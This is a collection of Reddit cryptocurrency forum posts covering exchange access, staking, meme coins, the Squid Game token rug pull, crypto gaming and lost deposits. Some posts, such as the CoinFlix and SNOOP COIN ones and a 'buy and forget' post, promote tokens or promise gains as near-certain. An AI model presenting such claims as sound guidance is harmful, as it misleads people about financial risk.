The only thing it's missing is the third world slavery component of the supply chain.... but I wonder who makes the mining chips? Who designs the logos? I saw this posting to get people to design a logo, but I doubt any of them got paid: [https://www.freelancer.com/contest/Design-a-logo-for-Pawthereum-1980965?w=f&amp;ngsw-bypass=](https://www.freelancer.com/contest/Design-a-logo-for-Pawthereum-1980965?w=f&amp;ngsw-bypass=) I just sold out of that project because I saw the trading volume was going down but the price was going up, and there were other clues that it was a shady project.  


At the very best, shitcoins are a pyramid scheme casino. Honestly though being obsessed over that coin was pretty fun and I'm not saying I'm out of this. I'm moving to polygon coins to be better for the environment and save on gas. Honestly I'm bullish on ethereum too, they're all about pumping up the value of the token but that just makes the product worse because gas fees also go up, so idk why they aren't making it inflationary instead of deflationary. You should be able to short it that way and still make money, as long as you can predict the value you'll make money. I don't think ethereum can keep up with competitors. Not saying polygon will win out but it has a better chance than ethereum imo.  


tldr this shit is like distilled poison and it's all terrible and I'm really looking forward to gambling on more crappy coins because it gives me such a rush.

Thanks for all your help, folks. First, advising me about Coinbase, then Binance, both couldn't be used because I'm an American living abroad.   
Either I need an American number to verify or can't choose American nationality living in another country.  
I was verified on Coinbase, then restricted.   
I guess American laws 
So I came back and asked again and came up with KuCoin.   
KuCoin was ok to start but then when I wanted to buy, it said I had to use Banx which, again, with KYC can't be American living abroad  unless I'm missing something .   
I know it's a special situation but I can't be the only one. I'm sure there are others out there who leave to travel  but I guess they would have family or something to help them out.    
I'll just have to settle for my little celestial pieces from the faucet daily for now.   
But if anyone else has an idea, I'd love to hear it.

edit - I'm in Bahrain for a couple years now.
The problem is opti0ns for KYC. If I choose American nationality, I need an American phone number and address for verification.
If I choose the country I live in, it doesn't allow me to choose American nationality.
Most other countries are there.
So it is like, US and others can't be used together.
For Example -- if I choose the country Im in as residency, it will still allow me to use United Kingdom as a nationality but not United States.
There's just something weird with being American and getting verified.
Can't mix America with others
edit -- to add, I tried on both Binance and Binance US as well It can't be mixed up. It either has to be entirely US or entirely out of the US.

Squid game was a token built around a show that was meant to be a commentary on capitalism where everyone who participates in the game *dies*. Well, almost everyone. 

One old man, the #1 participant, created it. Then invited a host of others to participate for a chance at millions. Statistically the odds were stacked against them, and they played anyway. All but one lost *everything*. 

Everyone who invested in SQUID token chose to do so, knowing the show/game it was based off of. 

Sounds like SQUID did exactly what is was created to do as well, but nobody wanted to read the white paper. Locked into a coin for three years? Who made that move? Who actually read the white paper and said "this is a great idea?"


*Discuss*

This is completely hypothetical right now but I know that brave browser (I think) rewards users with bat (I think) and I wanted to understand how. So suppose i have some hypotheticalandroid or iOS app that users use. How would i go about rewarding the user with some crypto coin that they could then sell on an exchange? 

My initial thought would be to have the users input their wallet address for the coin to be send to but I'm not sure as a user I would ever want to give out a wallet address to an app? So it's either that or somehow generating a wallet in app per user. The rewards come from some master wallet of the coin and some service (no idea what) would have to transfer the coin from the master wallet to the app wallet. Am I on the right track?

The success of Squid Game token is a stinging indictment of the media in general, and the crypto media in particular. The "anti-dumping" mechanics employed by this token turned out to be a funnel trap to lock investors into a situation where they would have to pay more money via Marbles to actually sell their Squid.

The website reportedly looked polished and had developer profiles listed with neat little resumes. 

Very few people actually bothered to investigate those resumes, unfortunately. 

That is inexcusable for the cryptomedia. 

It is also an opportunity for one of your crypto billionaires. Start a *real* crypto news site that actually does real research into shit and you will become the go-to outlet in 90 days.

Hi everyone. I am new to crypto trading, and so as such I am still in that phase where I am looking at pretty much every coin and trying to find which ones are legit and great, and which ones are not. I recently found Jaspy, which is currently at  $.17. when I looked at the past year, I see that it dropped this year from $5. It seems to be starting to go back up, but I was curious if it is worth investing in this.

My biggest concern and secondary question that I have been unable to answer is what happened that caused the huge drop? It seems like it would be possible for it to go back up, but I don't want to invest if it's something that is unreliable at best. Thank you guys for your help

Im in Australia for context. And I was considering USDT since its tethered and I dont have to worry about fluctuations. The only fluctuations I might have to worry about is USD to AUD fluctuations which is fine as I wont be converting it anyways. I intend to immediately convert the USDT into ETH or DOT. 

So as far as I can tell, I give my clients my USDT deposit wallet address. And tell them the amount I need to see in USD. They then send AUD or USD from whatever exchange or wallet they are on. 

Is this the way to do it? Or am I missing something? I just feel Im not doing something right or correctly or efficiently. I considered accepting ETH directly but with the prices fluctuating hourly and daily, I think its risky. Unless I set the amount in ETH instead of AUD. Stable coins like USDT seem like the safest choice. 

Please advise me on what to do.

Recently, Ive seen this sub have a change of heart regarding meme coins, which Im happy to see. Its really just about making money, so Im glad everyone is wishing their fellow degenerates well. However, Id prefer if we called meme coins by another name: gambling. 

For those of use that have carefully chosen projects, weighed the risks, and chosen our desired entry point: these assets appreciate over the long-term based on a variety of factors, but it most often comes down to utility. Its investing, not gambling. 

As for meme coins, there often isnt much or any utility. Any one of us could creat a coin, list it on the BSC chain, and sell it the masses. Its success is purely based on luck and chance. 

Dont get me wrongI love gambling. Still, I dont go into the casino and put $500 on black and call it investingits gambling. Its unpredictable, completely up to chance, and pays for the high-risk. Just like with blackjack, when it comes to meme coins, the odds are stacked in favor of the house. The contract owners hold all the cards and sometimes players get the benefit of the odds. Thats why they pay so well when you win. 

For those that won, congratulations on beating the house. For those that dont, what else did you expect from playing meme coin roulette? (Im looking at you Squid Game coin)

Edit: Please spare me the we dont know shit about fuck nonsense. 

TLDR; if youre going to buy meme coins, you might as well call it gambling

 **BUT NEVER HAPPENED IT HAS IMPROVED**  

   
It is not news that the number of people saying that moonfarming brought a lot of shitpost,   
that this would quickly sink the sub.

The amount of daily participation increased a lot within months since [3 Million sub](https://www.reddit.com/r/CryptoCurrency/comments/nma4yy/rcryptocurrency_about_to_hit_an_ath_of_3_millions/),   
the best posts of the month are about [news](https://www.reddit.com/r/CryptoCurrency/comments/q10jmq/pandora_papers_12_million_documents35_current_and/) or [news that are practically discussed here before anywhere else](https://www.reddit.com/r/CryptoCurrency/comments/qc16f2/btc_just_broke_its_ath_to_all_people_that_hodled/). 

Isn't that amazing?   
Now add that most cryptocurrency communities read this sub, not to mention the best memes are made around here.

I would really like to take advantage of staking my Crypto holdings (or earning APY through other means that staking), but from all the major exchanges available to US customers (FTX, Binance, Coinbase, etc.) it seems like my options are extremely limited.

I have several Cryptos (BTC, ETH, SOL, DOT, LRC, UNI, ADA, MATIC, AAVE &amp; AVAX) but right now I am only staking SOL via the Phantom wallet. 

Is there an efficient way for me to stake the rest of these on a central platform/interface? Or is my best option to really drill down to each project and utilize a unique solution for each Crypto. The reason I'd like to avoid this is because I DCA monthly so ideally would not like to have to deal with 10 different interfaces if possible (but am willing to, or potentially consolidate my holdings if that is what is needed).

It seems like options available for international customers like Binance &amp; FTX are too troublesome to create accounts on via VPNs and I'd like to avoid any legal issues...

I'm looking online and I know the popular ones are Kraken, Gemini, Voyager, Binance, and Kucoin.

I assume the ease of UI is probably subjective, but between them, or any others feel free recommend, which one has the best customer service? Which has the most selections of altcoin? Which has the lowest fees for fast and frequent trades? Which ones let you lend them for interests?  

I'm looking online and can't seem to find a great resource to compare them, so if anyone has any, do feel free to share away, thanks for any help, ideas, or opinions!

I've been reading about the Squid Game rug pull today and aside from obvious red flags such as grammatical misspellings on the website and white paper, one big issue was that the smart contract apparently did not allow token holders to sell due to an "anti-whale mechanism". 

It's not hard to imagine a clever team putting together a nice looking website (to be honest the barrier to entry for a good website these days is pretty low...especially in a tech centered field like crypto), descent looking white paper, yet have something nefarious in the smart contract like the Squid Game token did. 

The best option would of course be to read the smart contract, but those of us who don't have a technical background don't really have that option. Are there any resources that those of us not able to read smart contracts can use to see if projects we are looking at have any major red flags? I know there are audits that projects push as part of their advertising, but I've also read that projects passing an audit in no way guarantees there isn't something nefarious going on still.

My wife is in need of medical treatment that wont be covered by insurance. Weve already started a Gofundme, but I was curious about tax implications if I receive any crypto. Id like to offer this option to donors, but I dont want to get myself in trouble. Ive tried researching, but the tax laws are confusing the hell out of me. I know money raised isnt taxable, but not sure about crypto. Can someone answer this, or at least point me toward some resources to educate myself? Im in the USA by the way.

Hey r/cryptocurrency

Long time lurker, first time doing a proper post here. Maybe this belongs on moonshots or some other crypto sub, but y'all are reddit's core crypto community and this seems like the place to post honest thoughts on a project with potential.

Sorry this isn't as entertaining as my "I will own GameStop" post I'm better-known for over in the stock gambling subs... but this is something I feel as confident about, so here we are.

___________________________________________________________________________

#Things that get me excited about CoinFlix:

**- 100M total tokens** (not gonna take much market cap to get some serious token value)

**- 1/3 of the transaction fees are redistributed among token holders** (big enough bag = opportunity to just take profits from those reflections without dipping into one's base holding)

**- They intend for the token to ultimately be used to finance films and be used for general entertainment purposes** (from where I'm sitting, if they hit $1; that'll be easy for folks to think of it as actual money)

**- When the company finishes whatever production work they do on whatever they have lined up, they'll be shoveling 80% of their profits back into the token** (i.e. even if no one keeps buying, it will theoretically increase in value just from their own profits)

**- Liquidity pool is locked until some time in 2023**; and it looks like there is no individual wallet holding more than a few % of the total supply (save for the token vault and the company main wallet that owns the liquidity pool).

**- They just started what looks like an ad campaign of some kind today** (so I'm expecting a continued run up for the next few months)
______________________________________________________________________________

There are a lot of ways in which this token could increase in value, but they would literally *all* have to fail in order for it to not go up.

It's not often I come across a token with a development team that has the balls to show their faces / names, and I've run into shockingly few tokens with a real-world use case; and honestly I think that feeding company profits back into a token is a great way for any company to just ditch the stock market and let investors experience profit-sharing without a bunch of messy contracts, market makers/hedge funds, dividends, etc.

What is the best way most of you have found to average your portfolio, buy everyday? Buy every week ? Buy every month?  Set up on an exchange to auto buy for you etc?  Do you also set money aside for dips ? 

Do I DCA consistent in both bear and bull markets ?  

I try and throw 50-100$ a paycheque into one or two things but I want to be more consistent and focus more on a few ; I dont wanna spread myself too thin. Ive been told to diversify but I dont want to have 20 different ones with little capital in each 

Im just asking for strategy and then Ill do my research on a few of the ones I find appealing.

Thanks In advance

Im running a basic minerstat and etherpool setup with my prebuilt Alienware PC that has an RTX 3080. Should I change the clock settings, or will the preset ones be fine considering its a prebuilt?

This is because of the annoying character limit:

I have an awesome setup where I live in a student apartment unaffiliated with my school that has a flat fee for electricity. Im mining crypto for free, basically the dream. Its a really big apartment building so I dont feel bad about abusing the system a little bit and theres little to no chance of pushing up the rent, but I dont want to push it too far.

Hi everyone,
I'm new to crypto and started on Coinspot, I looked through a lot of personal reviews for many crypto exchange sites in my country and Coinspot had the best reviews.

I've slowly been learning the "language" and terms but could anyone explain to me what staking is and how to do it on Coinspot? I can't find anything on Coinspot that explains and allows this.
Do you need to have a minimum amount to stake?
Can you stake any crypto or only the "bigger" ones like Ethereum or ADA?

Thank you in advance

Which L2 or sidechain is currently giving out the best yield on stablecoins? I don't have enough capital to offset the gas fees on Mainnet so I'm looking at Arbitrum, Harmony, AVAX, whatever. I have my main fund that I DCA into, but I want to set aside a portion in stables for whenever things start to go south and I might as well get a yield on them in the meantime. Not currently interested in using Celcius or BlockFi or whatever CEX. 

Also, if anyone has a breakdown on the most efficient process to get FIAT into DeFI, that would also be appreciated. Currently I am onboarding FIAT through a CEX, transferring ETH to my hardware wallet, using MetaMask which is linked to my hardware wallet to bridge my ETH to Optimism (which I want to stop using because of the lack of Dapps) , swapping my ETH for whatever stables I desire and then providing concentrated liquidity on Uniswap V3 in a tight range. Is there a way to get my funds to DeFi with less steps?

I was around when bitconnect fucked alot of people. Is staking in the various places (celsius, blockfi, etc) introducing a level of risk for your money? How can you say "not your keys not your coins" while the coins sit on some party's server so you can stake? 

How are these services different from bitconnect? Staking seems to require a considerable amount of crypto to really make the dividends worth it.  

While the same fear exists with some of the exchanges, these newer "earn 6% interest" services still seem to carry some decent risk, no?

 There's been a lot of talking about which cat coin will rise to compete with DOGE and CatGirlCoin has been one of those. The website and overall image of the coin is very immaculate I will say, but there are other problems I think it ahs. 

Such as....

1. It might be Too porny for some investers
2. It does offer 1% earnings but dosent give enough to cat shelters
3. DOGE isn't necessarily NFT related but Catgirl coin is. The whole thing is about the NFTs
4. NFTs in general, some people may not understand them or what they are
5. The spike today won't last and might be a pump and dumb
6. It's like anime and not everyone likes that

Maybe it would be another cat coin, but CatGirlCoin might not be it. Just offering my 2 cents!

Hi guys,              
The scamming problem isn't going to end, but if there are 20 scammers in this subreddit and if and I can convince 10 of them to stop bringing harm to people who are minding their own business, then I think I've done my job. I'm not perfect, but here goes...                 

There are a lot of cryptocurrency apps out there that might be looking to hire technical support. Like, for example, Exodus wallet and maybe a few other price-tracking apps. These apps are not all perfect either. If you can get a job as a tech support specialist you will be able to grow professionally and, in some ways, you can also be paid in bitcoin. At least, I know that exodus pays their tech support staff in bitcoin.              

There are also these two websites:                
https://crypto.jobs/                    
https://cryptocurrencyjobs.co/                  

Start looking for work.               
EDIT: Don't forget this website: https://cryptojobslist.com/

I have been dreaming about it for a long time now. How great would it be to earn and own little chunks of the games we love to play? What really get's my mind going, is whether or not they can break into the actual gaming community. 

For the current markets I have been keeping an eye on (MANA, SAND, AXIE, ILV, SPS, etc, etc,), I believe some will see pumps that will be short lived. I have done some deep diving into a lot of titles and they don't show enough promise to pull in players and keep them going long term. Especially since player base is what will drive the popularity.

The biggest hurdle for crypto games is going to be releasing a viral title that can compete with mainstream developers. Ultimately, it will be actual game studios who need to carry this industry. I don't see them batting an eye at the crypto space unless there is absolutely a reason for them to. The only way to draw out the big boys, is by dropping a title popular enough to scare them into the competitive field. 

Then we will be sitting in the waiting wave #2. We will have to wait for the larger dev teams to produce something that actually rocks. They will be showcasing awesome projects, similar to what we see with Iluvium, but the first impressions will not be an indicator to the attention that the games will receive. It will all come down to the gaming community responses and reviews. 

Then, it will happen. Usually on a title we least expect to soar to the top and captivate masses of people. The next title for people to fiendo it up on like a bunch of gaming crackheads. Only, it will be unlike any other game because all of the typical time investment games command from the consumer will actually pay off and give purpose to the player. I can't wait for it.

&amp;#x200B;

TLDR - Early coins might pump a bit. Big game devs will enter the scene and prospective coins might pump a bit. Big devs find the G-spot of games, then those game coins will go to the moon!

"The reason why %99,69 wont ever succeed in Crypto?!"

And im telling you that %100 of you will SUCCEED, as long as you do this incredibly easy strategy!- Do absolute nothing.

Yes you heard me right, do nothing, buy and forget.

DCA every month and then go fuckin forgot existence of Crypto. Go to Cinema, hang with the buddies, play some HALO, litteraly do anything you want, other than looking into charts 24/7.

And i promise you... You- no, WE will succeed in 3 years.

Good Luck to all of you. Love y'all!

Has anybody gotten the email with the link from Burger King?

I went and got a Whopper meal three hours ago and have yet to receive an email other than the receipt. was wondering if anybody else has had any luck with this yet?

&amp;#x200B;

Also noticed on the fine print that you can send a letter in the mail with your information on it to get the codes sent to you without having to make a purchase, anybody going to try this? I believe it said you can get one code for everyday the contest is going on so 21 total.

not sure how many Whoppers I can eat, but going to try at least a couple of times and see if I get lucky.

We get it, making money is pretty hard. It's tiring, the elite 1% control how the world works and everyone is desperately trying to get their slice of the pie.

But here's the problem. A lot of people are short sighted. We see in the media about millionaires, billionaires and how companies are now valued at trillions. 

It's stupid to even be jealous of them. Why? Because look at most billionaires. All of them have mostly everything they want, all of them donate to a number of start ups and charities, all of them can do anything they want. 

Money is relative. What's expensive to you make me less expensive to another. $2M might be rich to you but to another, it's $50M. 

The fact all of us are able to invest into crypto for hundreds of dollars (which is what a lot of us have invested in here) literally shows just how privileged all of us are. 

Anyone here born in a developed country, in a working class family has it better off than millions of other people around the world. Yeah, you've seen those poverty videos about Africa, Asia and South America. Many of you have seen homeless people. And you might be tired of that because your bubble is just like you, hard working, paying taxes, doing the right thing only to be fucked over by the elite. Yeah you deserve to be mad about the system, me too. 

But saying to others you're poor when you really aren't is a joke. 

Here's the best advice you'll ever here: if you truly dislike your job, quit. I cannot say it any simpler. There are millions of people who work a bullshit job with rubbish management which take advantage of workers. Don't settle for this. 

If you hate your job, find something better in a non toxic environment and move on. If you're middle class like I am and want to get ahead, have a full time job that's not ridiculously draining and invest. Or if it is, at least enjoy what you do. Of course it'll take time to figure out what you like but you need to try and seek out for what you enjoy doing. 

You can invest into boring ETFs and shares and also invest in crypto. Diversification works. If you wanna Yolo into crazy shitcoins, by all means go for it but accept the consequences should something happen. 

My point is, _be grateful_ 

I feel a lot of us never step back and realise what they've accomplished. 

If you've been here for 1, 3, 5 or even 8 years, congratulations you've likely made decent money. Even if it's just $5K, that's still a lot of money to somebody somewhere else. _Be thankful_ because that money could pay for somebody's operation elsewhere for example. 

A lot of us get deep into capitalism but fail to realise that the system is built on a few financial successful winners with the majority doing all the work for crumbs. 

You're heavy into crypto? Good but be smart. Take your pfkits and enjoy your life. But don't forget to go outside, talk to people, find a girl and make a move, get laid/ go up to a guy and tell him you like him, kiss him,  go solo travelling, visit countries you've only read about and spend time with locals who don't speak English. You'll be surprised how many people on a shoestring budget backpack abroad. I saved up to travel and was shocked there were people with $100 to their name travelling. 

If you've made some gains, be thankful. If you're not there yet, try again, read more, learn more. But please don't bring people down. Insecure and unhappy people bring people down. Don't brag, try to help the noobs by educating them or learning further. 

Nobody has a bullet proof strategy. Nobody knows when the bear market will arrive. 

But go out and enjoy your life. There's more to life than just money.

I decently stumbled across a meme coin known as SNOOP COIN . It seemed alright at first but after I joined the discord and began to say hello I was greeted by an admin shilling some casino token. This was a discouraging experience considering the discord was linked directly to the website. I the. Told him its not cool to shill a coin that isnt for that server and I was kicked. I researched the owners and they seem alittle fishy. I still bought 16k of them though at .01 a coin with 21m supply seems like a good deal. I come here asking for your thought. Is this coin able to be pumped to a 1B market cap making it roughly $50 a coin. Do the owners and the community being shitty matter. This coin from a mathmatical standpoint can make millionaires very easily.  N.F.A please let me know your thoughts . DOGE TO THE MOON!!!

There are thousands of different crypto currencies,
Most of them, you never heard off, never had peaks or dips, they're just static at whatever they're worth (for example 0.001)

Then a rich guy buys 10 million of it... Then buys another 20 million, then buys 50 million and people go "owahh it's going to the moon, let's buy it and get rich"

Coin is now worth $0.1. Goes into every trading platform, and People hype buy, slowly climbs into $1-2 the initial investor starts selling millions and millions of it as people 'buy the dips".
Eventually initial investor sold half of his coins for $500 million (initial investment was 80M) and Leaves the coin to "correct" for the next months.

Every coin, more or less behaves this way. Investor buys lots and cheap, massive peak, people hype and fund all the dips as the initial investor pulls out slowly.

With most coins, people are filling up the pockets of the rich with dreams of 'going rich easy'.

This is better than pyramid schemes, and untraceable. Sure you can anticipate the hypes, put in early, grab a 20% rise and pull out before invester. But he's the one filling his pockets proper good

DYOR meme is silly, and the vast majority of yall have no clue what youre buying. Just like with equities most people dont read financials or listen to quarterly investor calls. The vast majority of crypto investors know so very little and cant make an educated investment decision. But, unlike equities crypto wants to push away the only governing bodies that protect the average joes. DYOR is simply a way to justify not wanting the government to regulate the industry, and take zero accountability as a group when thousands of people get wrecked by a rug pull.

I am a bit late to the ALGO game, but I have just discovered how much APY the Yieldly app provides. You can stake your Yieldy or other ASAs for crazy APYs that range from 40-110%. I have always invested heavy into ALGO, and initially I honestly thought that everything else that came with ALGO was a bit corny or just too good to be true. After giving it a try and converting my ALGO through the newly released tinyman app, I am extremely excited and ridiculously high on hopium.

 

Now that I got that out of the way, I am curious to know why more people are not aware of or have not spoken much about these opportunities on here. I know that many people here will say that I am shilling the coin or promoting out of my free-will, although I honestly am not. I just really want to know:

 

What are your thoughts on ALGO?

 

Are you staking through Yieldly and using Tinyman?

 

What are is keeping you from using ALGO /Yieldly /Tinyman?

On August 30th ADA close above $3, and ALGO closed at $1.02. Since then they've both come to meet in the middle. I've heard people say ADA is over priced (don't necessarily agree). 

I know the price means nothing, and we should compare market caps, but I think if ALGO passes ADA in price it might have have psychological effect, and people might start taking profits from ADA, and putting them into ALGO accelerating their current direction.

Should I sell my ADA for ALGO? Have you guys thought about it? What are your thoughts?

The recent run up of MANA after Facebooks' Metaverse announcement got me into learning more about MANA and what can be developed there. Naturally I also remembered that one of- if not the most popular trend in crypto is NFTs.

I've also been hearing a lot about how, if you wanna get rich, these days being a conten creator is the best bet. And now one of the most explosive trends in our time is mixing up with content creations. So we have a growing market where not just digital art, but now also virtual land and video games are beginning to auction for some pretty good prices, primarily in ETH from what I've seen.

This might only continue to grow as giants such as  Face ...oh sorry, giants such as Meta are going to be driving the growth of the virtual world. So yeah, if you're good at avoiding scams, this might be an amazing time to be a content creator.  


Is there another field or group of people you guys think stand to gain the most from crypto in the coming years? I'd love to hear opinions.  


(Personally I think we're in exciting times, we're developing a whole new frontier for humankind to interact in, with so many possibilities)

I don't understand the phycology of people, yesterday and today we had countless posts about squid game, everyone super worried with good reason because a scam is a scam and those responsable should me pointed out. 

But after the Shiba frenzy there has been this project called AnubisDao on ETH, it was a cute dog page that they promised it would have the mechanics of OlympusDAO. It had several famous devs involved and they managed to collect 13000 ETH or $60million aprox, they rugged everyone taking all the funds out of the contract. And now inside that team they are pointing fingers between each other and no one knows where the funds are. This happened 3-2 days ago.

What surprises me is that this was a rug where famous devs have been involved and no one is talking about. "DYOR" "you should put your money on people that has been proved right before" "trust on respetable people, not on randoms" etc etc...in this case it has also been proven wrong, and 30 times the amount of SquidDao have been stolen.

Crypto is a dangerous space, random projects that tells you in your face that you cannot sell your funds (basically telling you I'm gonna steal from you), or others that seem like a good bet but they fk you up anyways.

Stay safu.

This post and cheer up post, its dedicated to all of you who are actually doing DCA and not spending your money on things you dont truly need.

Youre being part of a different kind of human being, on a psychological level. We all know things are manipulated, even minds, and the marketing strategies are so good, they will sell you EVERYTHING, and even things you dont need, things youll buy just to represent the idea that youre making it when actually youre broke. We see this every day, society its so deep into this behaviour where they are trying so hard to look successful, when the reality behind that last iPhone, that brand new car, or that gucci bag its that they are wasting time, energy, and money that they will not have in their future, and those things will lose 99% of the initial value overtime.

But you, youre thinking long term, youre waking up to the real world knowing that your future will be full of good things to come if you invest now istead of trying to impress other people.

So take a little credit, in silence, work hard until you dont have to and you can retire 10 years from now, or maybe 5.

Got in around 80 cents a few months ago. I knew it would have it's day. And by golly it sure did. I watched my investment 5x in a matter of hours and then I watched it all fall back down even quicker without selling one coin lol. Oh well next year I guess haha. Still think it has potential to  hit those returns again in the future. Prob just gonna have to wait a while longer now. Hopefully by then it will be less in tax too. I guess that was the main reason I didn't sell, didn't wanna pay the tax man. *Sigh* it is kinda sad watching a nice chunk of money come and go like that though. At least my decentraland didn't drop as hard.

**So what Crypto Game isn't just a flavour of the month, and has longer term potential rather than a quick fizzle?**

###Basic metrics to confirm first are:

- Is the game element reasonably enticing, does it have some fun to it or is it just robotic button clicks?

- How many active players does the game have, and how much is this increasing?

- Upcoming developments?

Alot of games can tick these boxes but not be successful, so what can further help define a game for potential?

#Reward to Grind Rate

All games have a reward to grind element, even games which have captivating stories and fixed linear maps have it. How many draws did you search playing the last us?

Crypto games operate around the reward to grind rate or R/G rate. So they need to achieve the correct balance to be successful long term, or to survive the Wave cycle.

###Assumption
The following assumes that the game in question isn't terrible to play, but also isn't compelling without a decent economic reward.

##The Reward

Games can have a token, or NFT but all have the underlying principle that the reward is exchanged for valuable crypto/money; a good ROI. I'll just use the term "reward" going forward as each game is different.

##Reward Sustainability

Reward sustainability is key, as without it the reward becomes worthless. Issuing rewards are an inflationary mechanism. High inflation decreases the value of exchange for the reward removing the economic incentive for the game. As in not making the reward worth the grind.

Good games manage this by varying the Reward to Grind rate in the game, the R/G rate. There are many ways to do this but it's dependant on the game play mechanism. This keeps the reward issuance sustainable at a cost to the player's ROI during times of peak popularity.

##Typical mode of play

The basic mode of play for these types of games are they start off with generous reward rates as it is worthless and the user base is small. As popularity increases the reward rate decreases and/or grind increases. The player base increases and subsequently the value of the reward increases. The reward exchange value increase is due to increase of demand of a limited quantity of rewards. New players either trying to buy in or existing players wanting move up a tier for a better R/G rate are all reasons for increasing the price. This holds true whilst ROI is still good.

##The Issue

The issue here is that as more and more players pile in the reward rate for grind decreases more and more. The reward exchange price increases as the in game demand increases. When this happens people stop playing as the R/G is so terrible, and reward too expensive that it's not worth it, read it as ROI is bad. Then players leave or stop signing up. R/G decreases but not before the reward value plummets due to lack of demand. Then the cycle repeats if the game survives this drop. A wave type cycle, of building popularity, peak popularity and then a fall.

#Investment Approach

Say the game has ticked the boxes so far, and you feel it manages the R/G as best as is possible. To see a high ROI you need to be in early or after a peak when popularity dies off and to sell at the popularity peak. The risk you take on is that you have no way to know if it will become popular and/or make a popularity comeback. There are some hints though.

##Maintaining Core Player Base

The key hint is knowing a game has a core group of players that will maintain a healthy player base in the run up to and after a popularity peak. So what would indicate this?

###Variable Upfront Cost

Putting a variable upfront cost helps keep players in the game, as the upfront cost compels players to get their ROI, which means they put up with a lower R/G rate or drop in reward value. So maintaining players during periods of poor R/G or low reward value. Both sides of the peak in the wave.

A variable upfront cost tied to the reward value also makes the cost of joining steep at times of peak popularity. Which makes existing players stay in to avoid having to pay to get back in, but more importantly stops large influxes of new users coming in driving the R/G low quickly then leaving. This ruins it for all players and an exodus will follow.

###Tiers

Veteran players or paid up players get a seperate tier. Once players have reached or amassed to a level and more importantly they maintain that level, they are in a different league with better reward rates. This compels those users to maintain the commitment to the game, after breaking even. This tier level needs to be hard to reach otherwise reward sustainability will be in question.

It also give new or low tier players reason to grind when the R/G is low. As there is an economic payoff once the high tier level is reached or at least that is what is hoped.

DYOR as this is one approach of many.

**TDLR: Games need players to be successful and the reward/grind rate behaviour of a game is key to it being successful.**

Hi all,

I am unsure if anyone else has had this experience with them or not. But I have started using the hotbit exchange to use their matic enabled network to transfer matic and safe on fees.

At first I was able to transfer my matic out to my metamask wallet, where I could swap and engage in staking rewards.

I sent back my matic, 911 matic to be exact. I sent it from my metamask, using the polygon network, to my exchange wallet on hotbit, on the same network.

The transfer was done, and confirmed here you can see the transfer arrived on my wallet address: 0x4E817fe4C5022656BD97715908BC4aC4808214B3

It shows the balance as 911 on the polygon explorer.

However, in Hotbit, my balance has not updated and it simply says 0. I have contacted them on reddit, telegram and sent through support requests. All of them have been ignored.

I have essentially lost over $1600 by using this exchange. Has anyone else had any issues with them? I do not know what their reputation is like, have they stolen money before?????

After raising the issue in their telegram, I asked for help which has been ignored. Every other message I have sent after that is deleted instantly. 

It seems very concerning and I feel like I've been fooled... is this a legit exchange?

Over the past 2 weeks the daily transactions per day are steadily increasing from a low of 66,000 to record 170,000 transactions on the Cardano blockchain - an increase in adoption is happening.


The network had a total stake of 23.9 billion out of 33.1 billion ADA coins in total for also a record high of 72% staked - a growing confidence in the project's future. There will only ever be 45 billion ADA.


Data can be found on https://cardanoscan.io/


However, despite the impressive numbers, Cardano continues to struggle and short-term projections remain negative. It is the worst performing top 10 for the week and is now valued just below $2 and will probably be flipped by SOL soon.


But let me end this with a hopeful note with a [detailed post]( https://np.reddit.com/r/cardano/comments/qjel89/charles_hoskinsons_big_picture_summary_of_cardano/?ref=share&amp;ref_source=link) from Charles Hoskinson's big picture summary of Cardano from his last AMA. - **TLDR; the team stays focused on technical development.**


Last month part of the team is on the African tour starting from South Africa to Egypt having conversations about the blockchain industry. They're promoting the technology as basically "the Swiss army knife of systems and incentives with the goal of accountability, resilience and decentralization." *Something something change the world for the better and include those left behind*


I'm a Hodler of ADA - this is a shameless shill, not FA.


ADA also not a dog.

I had a transaction on uniswap that was taking over a day to process. I tried to increase the priority but it was not working. So I went the route of canceling the transaction. Do the funds ever come back because the etherium that I was trading is no longer in my account and it does not appear to be coming back. 

I'm so confused and if a canceled transaction means loss of funds, why would there not be a warning stating this? Any help would be much appreciated because it was a decent amount and I'm pretty upset about it if that is what has happened.

I kinda hate giving these guys publicity. I don't know if it is an out and out scam but my story is thus:

Signed up a couple months ago but it looked and felt dodgy to me so didn't fund it. Then, while looking around for places to stake CTSI saw high rates on mycointainer.

When I checked it out, realized I have a wallet and there was an airdrop of some random worthless alt coin in it which made me feel irrationally happy.

Did a search here on reddit and found mixed but generally positive comments so decided to try it out with a couple hundred USD of ctsi. It went through and showed it is supposedly staked. Then, thinking that I would build the wallet send some few dozens of ADA (cardano) to it thinking I would do an internal trade for some other tokens listed there, using ADA because of low gas fees.

I followed the instructions on the website for the transfer, and I have sent ada to other addresses numerous times.

This time the transaction when through but mycointainer doesn't show as rcvd. Still giving the site the benefit of the doubt I thought, h'mmm maybe if I sign up to their monthly subscription it will show my good intentions and also get me good customer service. Sadly, the interface for doing this on mobile device is terrible and I ended up doing a double charge because it looked as though the first attempt was a failure.

Yes, alarm bells should have been going off but I still wanted to give the site the benefit of the doubt, especially because it has an area for registering requests to update wallet for transactions/deposits that don't show up in wallet.

24 hours later, absolutely no response. The customer service links are not active.....as I used paypal to subscribe I created two case disputing the charges and instructed paypal that I do not authorize a recurrent payment (note there is nowhere on the mycointainer site that allows one to cancel the subscription.

Paypal stepped up and stopped the recurring payment and I still have the two disputes active, one of which the staff from mycointainer did respond to but have not responded to my response.

As it stands now, I seem to have ctsi staked (but I doubt it) and my ADA is not showing up and the mycointainer staff is completely unresponsive.

I hate to say it but it looks like I took a couple hundred USD hosing. Thank goodness I didn't just jump in with full funding.

What makes cryptocurrency better than fiat?

1. The first arguments in support of crypto which i have found very useful is that you can send money to anyone anywhere.
     But Exchanges are just as Banks that give digital      IOUs which can be sent from one hand to another. 
          This is just the same in conventional banks, legal tender is just  a physical IOU that you can exchange to purchase goods and services. And services like Paypal, cashapp allows you to send money to anyone without needing a physical IOU.
            The exchanges have as much power, they collect information before allowing transactions, they hold your coins. They can stop asset withdrawal. So what benefits does  crypto have in this regard.

2. The second argument in support of crypto by many is that you can make money. I mean why does one have to buy an IOU that supposedly has no use value (unlike gold) then expect it to rise for no reason save scarcity. What's the essence of the scarcity? Is it just an innovative way to create a competition? 
    We claim crypto saves the world, the problems of the world is of inequality, is crypto not widening that gap by rewarding those who are able to buy the scarce produce?
    What is the purpose of crypto in solving world's problems in its absolute volatile state. 

3. Decentralization- however, many believe crypto is aiming after decentralization. What problem is that solving? The space still seem controlled by the exchanges, government or whales.

Is there more knowledge to this?

